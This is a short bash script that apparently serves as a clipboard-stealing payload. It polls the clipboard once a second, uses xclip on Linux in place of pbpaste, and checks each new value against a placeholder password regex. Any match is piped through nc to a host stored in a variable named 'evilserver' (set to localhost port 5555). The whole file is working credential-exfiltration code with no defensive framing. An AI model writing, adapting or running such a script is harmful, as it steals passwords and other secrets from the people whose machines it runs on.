#This is more cross platform but requires nc
#TODO test on macosx
evilserver="localhost 5555"
lastpass=""
[[ "$(uname -s)" =~ Linux ]] && pbpaste(){ xclip -selection clipboard -o ; }
while :
do
	clipboard="$(pbpaste)"
	[[ "$clipboard" != "$lastpass" ]] &&
		[[ "$clipboard" =~ ^REGEXTHATMATCHESPASSWORD$ ]] &&
			echo -n "$clipboard" | nc -c $evilserver &&
				lastpass="$clipboard"
	sleep 1
done
#PAYLOAD
